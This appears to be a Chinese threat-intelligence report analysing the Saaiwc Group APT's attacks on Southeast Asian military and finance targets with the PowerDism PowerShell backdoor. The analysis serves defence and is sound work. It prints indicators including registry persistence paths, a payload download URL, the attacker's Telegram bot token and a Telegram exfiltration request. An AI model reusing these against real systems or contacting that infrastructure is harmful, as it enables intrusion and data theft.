---
title: 东南亚地区的新晋势力：新APT组织Saaiwc Group针对东南亚军事、财政等多部门的攻击活动分析
url: https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247492835&idx=1&sn=f27c09725a00a4e24273b783dccb83ab&chksm=f9ed885cce9a014a26d3f59c6d2549b14f950dae506635bf68adca70c76af2e00f51cb3b3936&scene=58&subscene=0#rd
source: 安恒信息安全研究院
date: 2023-01-07
fetch_date: 2025-10-04T03:16:49.782130
---

# 东南亚地区的新晋势力：新APT组织Saaiwc Group针对东南亚军事、财政等多部门的攻击活动分析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/AvAjnOiazvnfCFpgkTCrUkaPxyYvUic8icemHHmbbeZJ45JJRKVEDzKymjLVRlxcibor43f9a4NXdpQ8ia0Ao9Cyjiaw/0?wx_fmt=jpeg)

# 东南亚地区的新晋势力：新APT组织Saaiwc Group针对东南亚军事、财政等多部门的攻击活动分析

原创

猎影实验室

网络安全研究宅基地

**点击蓝字关注我们**

**一**

**事件概述**

2022年11月，安恒信息猎影实验室在威胁狩猎中持续追踪到针对东南亚地区的攻击活动，活动疑似针对菲律宾、柬埔寨、越南地区的军事、财政部门。

      攻击活动主要以ISO文件为初始恶意负载，运行后在本机注册表添加Powershell指令，最后加载Powershell后门PowerDism窃取本机信息并执行任意指令。根据样本中的互斥体名称，我们将该组织命名为：Saaiwc Group，内部编号：APT-LY-1005。相关攻击流程如下图：

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h49hlLBzcT3Vjk0CwEBbrq1arwafsdHKzNdKeSDibGfWHWfjufd72RGsw/640?wx_fmt=png)

经溯源关联分析，我们对该威胁组织的画像分析如下：

|  |  |
| --- | --- |
| **组织名称** | Saaiwc Group（猎影实验室内部编号：APT-LY-1005） |
| **组织归属** | 疑似东南亚地区 |
| **目标地域** | 东南亚地区国家（菲律宾、柬埔寨、越南） |
| **目标行业** | 政府、军事 |
| **首次出现** | 2022年5月 |
| **使用工具** | PowerDism后门 |
| **漏洞利用** | CVE-2017-0199 |

此次攻击活动大约发生在10月下旬到11月底，我们捕获到的样本信息如下表：

|  |  |  |
| --- | --- | --- |
| 文件名 | Hash | 其他信息 |
| Updates on AJEX DAGITPA 2022 on 200900 Oct 22.pdf.iso | edcd5ff1c2af9451405d430052c60660 | 2022-10-19上传针对菲律宾陆军司令部 |
| IPMIS CASCADING CY 202220221003\_18510684.pdf(3).iso | a6e085c099d681a71b937631a5e88c06 | 2022-10-19上传针对菲律宾5ID陆军 |
| MEF\_Password\_Policy\_V001.iso | c6abce3f12c14b7804a2532a3f5199b7 | 2022-11-25上传针对柬埔寨经济和财政部 |

相关文件运行后释放的诱饵文件如下：

**诱饵文件1：菲律宾军队 参谋长助理办公室下发的会议通知**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4A9F3LUy9icIH7GGzqibPbKZQic7YHZCtEH7S8WaLY5sOoRxMd7uSjJrlQ/640?wx_fmt=png)

**诱饵文件2：菲律宾5ID军队 2022年度绩效管理培训通知**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4mzcUIO7ODugD5TUHLl6g7PcPC9MXD9kiaVLg9tzoasVLRibTkticNEvWQ/640?wx_fmt=png)

**诱饵文件3：柬埔寨经济和财政部关于员工密码的管理要求**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4zDmkDCdwQXpBOckhXYpT52EEicSlLLcZ1q09fQ7LI2Dd1eRSt7ZBgqg/640?wx_fmt=png)

**二**

**执行过程**

攻击活动中的恶意样本执行流程如下：

1

Steg1 解密Shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4YdA0BnNbN8JaSKicUnxOGpz7O30p2X6iaicujXjWBo8sBibiaVRqhspIXBQ/640?wx_fmt=png)

2

Steg2 Shellcode功能

Shellcode执行后，将执行以下操作

1

创建互斥体"v653Bmua-53JCY7Vq-tgSAaiwC-SSq3D4b6"，防止恶意负载重复运行

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4R54Hrwdz52stdEQXV4NhKKfQNmhW27Cb63xX97V1Pibef3iaYjtAicWpg/640?wx_fmt=png)

2

运行诱饵文件

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h477CyicEOqU3lfnECyoAFjJj5gicFypaGQ2rMW56H8BoruquwQOehozVQ/640?wx_fmt=png)

3

设置环境变量，通过添加注册表项HKCU\Environment\UserInitMprLogonScript执行Windows自动登录脚本，实现持久化驻留。

4

同时设置GUID项，存放与Telegram通信的APIKEY：5621584862:AAGG6WcTvFu7ADpnMT42PqwOoKfTqMDQKkQ以及CHATID：5028607068

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4G5N3vnP31XGtFeDEPUr3DRkHnCmibJcmchUhl5yxPMxUb4WLn2wia6Zw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4MPic5h5cDoPz7f9nC95f9Q9j25ibo3CnvgUmTypXwLpAsGzLviaH56OIA/640?wx_fmt=png)

5

设置文件扩展名.abcd

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4AfBJIN2XibXK1IvMD4TGskfH2pvyVwESD3mq8MS4UiafyokicA2xhTxRQ/640?wx_fmt=png)

6

在注册表HKEY\_CURRENT\_USER\Software\Classes\abcdfile\shell\open\command路径下写入Powershell指令以及加密数据

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4TAlXPt1jOLHzRqQJb48oZH4ibWYkKq6dmnO0ScGlQsBGKEsvaR0edyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4UCMvfbvIUPwJdJ1PExZMGwffbE8GMpXBo1G6exP2nJgmcWK2Qycq0w/640?wx_fmt=png)

3

Steg3 解密Powershell指令

对注册表中Powershell指令解密如下

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h43FphDwdc376pKnePHazv11Nlt4AcGTlRQlJHb2joRdoPQibheQwyAmA/640?wx_fmt=png)

对Powershell指令去混淆之后

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4dsUf76mZr1lvlh43UR9x1a8bjflL9gLIfekFZxntSK0wv8rOovtMbg/640?wx_fmt=png)

对Base64编码后的Powershell指令进一步解码解压，得到最后阶段Powershell后门PowerDism

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4bIuBwibHVAjxoBcibdzU1Ny7jkyZNVTiby68AR6B1xFYhn3hkjPoYmBug/640?wx_fmt=png)

4

Steg4 PowerDism后门分析

该后门运行后将注册WMI事件，用于实现USB驱动连接时触发以下恶意行为

1

获取可移动磁盘

2

尝试解压%Temp%目录下的xxx.zip文件到%Temp%目录

3

若文件不存在，则下载hxxps://raw.githubusercontent.com/efimovah/abcd/main/xxx.gif

4

将解压后的文件夹复制并重命名到移动磁盘\dism目录

5

创建BAT文件system.bat，写入指令"@echo off cd %cd%dism start dism.exe exit"用于启动xxx.gif中的dism.exe文件

6

将\dism目录下的所有文件属性设置为系统文件属性+隐藏文件属性

7

创建LNK文件用于启动system.bat

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4oxpNhiaD95p4GugQVPCVFAnicN0Gotic478kfuGwOkrccUh6t7lOYGicjA/640?wx_fmt=png)

接着获取本机计算机名、用户名、IP归属国家-地区、出口IP地址、本地IP地址、计算机产品名、磁盘设备名、操作系统版本、反病毒产品等

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4v3CONZCfkbFiartx00b5DddSS58jicTDVsTDCVz1bcgSVoNMic7MGIJwA/640?wx_fmt=png)

发送至Telagram-API接口api.telegram.org/bot5621584862:AAGG6WcTvFu7ADpnMT42PqwOoKfTqMDQKkQ/sendMessage?chat\_id=5028607068&text={cn : (whoami) : (ip.countryCode)-(ip.region) : (ip.query) : ip\_local : model : hd : os : type : av :}

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4aZyaOk6N3AgWO3LBPXRLBiadDmBFpLTXr0xEso7hdib8ovTXxTJPFzibg/640?wx_fmt=png)

凭据发送后，C2将为当前感染主机分配新的标识

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4pCfrhLstt8WAT3kImo0Rl0ibEl2e5MELx2xAsuYvVznv8jXKibtwUu6g/640?wx_fmt=png)

从Telagram-API接口api.telegram.org/bot5621584862:AAGG6WcTvFu7ADpnMT42PqwOoKfTqMDQKkQ/getUpdates获取后续指令执行并回传至Telagram-API接口

api.telegram.org/bot5621584862:AAGG6WcTvFu7ADpnMT42PqwOoKfTqMDQKkQ/sendMessage?chat\_id=5028607068&text=$info

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h44Mh5PhJzIhN7Wibib784U7PcC6b1K1JTN7ZCJ6oqzgElpucTVY105Tmw/640?wx_fmt=png)

关于指令分发的部分name和task内容如下，我们发现C2将对特定用户执行特定指令。例如，针对DESKTOP-GJ77TNV用户，恶意负载将检索主机OneDrive目录下的文件信息上传至C2

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4uogQoN7lE3LjQxOtgf9oBD2IibghMnPFB3y3D02roABkibkvMlzFc5yw/640?wx_fmt=png)

**三**

**传播途径**

PowerDism后门可通过移动磁盘传播。当检测到移动磁盘存在时，将从Github（https://github.com/efimovah/abcd）获取加密负载，解密并移动至移动磁盘目录，而后创建BAT、LNK文件，使恶意负载随目标机器开机自启。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4eTm38buefPY8vtzzibYRYeoG021hoSLZjht7DEMpzX89wTKkwdeFp0w/640?wx_fmt=png)

恶意文件启动后利用DLL劫持加载目录中DismCore.dll文件。随后解密同目录下的Dism.sys文件，并在内存中加载PowerDism后门以窃取移动磁盘信息。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4QGmXZ6GjriabgFJJtO0NHpjGO8bXxib0zEUzOQiaY3qCHP4rq8dtSdJbw/640?wx_fmt=png)

加载后的Shellcode与Steg2相同，均为增改注册表键值以植入Powershell指令。Powershell指令功能与上述几乎一致。

四

**溯源关联**

除以上样本外，我们还观察到攻击者于2022年5月针对越南投放的攻击样本。

|  |  |  |
| --- | --- | --- |
| 文件名 | 文件名 | 其他信息 |
| Application-Form-YSEALI-Academic-Fellowship.iso | f02a96b84231da7626399ff1ca6fb33f | 2022-05-24上传针对越南YSEALI东南亚青年领袖计划 |

**诱饵文件4：东南亚青年领袖计划申请表**

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4liblbwEHVpSsicAfic3v6dEjlusYbfgLa4I6eibpXWEPAA3OOFmlnSxDEA/640?wx_fmt=png)

与10-11月攻击样本不同的是，攻击者5月所用的攻击链为CVE-2017-0199漏洞利用加载带有恶意宏代码的远程模板文件。

     宏代码将读取UserForm窗体内容，将Powershell指令写入注册表中，后续恶意行为与上述一致。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4mJdEA1dd3Zv04h0xYVSiaSic6PtVCXXXx3c4VxIaMLKQ4xU219FWxicVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h42JKgWibKEOsUy1nag6v8xUB6UTS2bzia8yib48xhiaAX9CgSM2Z8WPCogw/640?wx_fmt=png)

此外，攻击者的Github更新状态，主要集中在上半年3-5月，与下半年10-11月期间，与我们发现的两次攻击活动时间基本吻合。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4UtCyhfJnQOKkxyrjpA7ml4lXT2egC5EsbXzeQuFp73ia154TckuibU8w/640?wx_fmt=png)

进一步对攻击者提交至Github时间进行分析，我们发现攻击者处于UTC+7时区。将相关时间换算成UTC+7时区后的统计图表如下：

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvne2plQRo6JGMyGTeznjo0h4npTyWE1thibfemNlxFPQ7pHOymCqWPwebM2QfWXVHRodVjFZ8iaOVcHg/640?wx_fmt=png)

UTC+7时区为中南半岛标准时间，攻击者疑似来自东南亚地区。

**五**

**防范建议**

目前安全数据部已具备相关威胁检测能力，对应产品已完成IoC情报的集成：

●安恒产品已集成能力：

针对该事件中的最新IoC情报，以下产品的版本可自动完成更新，若无法自动更新则请联系技术人员手动更新：

（1）AiLPHA分析平台V5.0.0及以上版本

（2）AiNTA设备V1.2.2及以上版本

（3）AXDR平台V2.0.3及以上版本

（4）APT设备V2.0.67及以上版本

（5）EDR产品V2.0.17及以上版本

● 安恒云沙盒已集成了该事件中的样本特...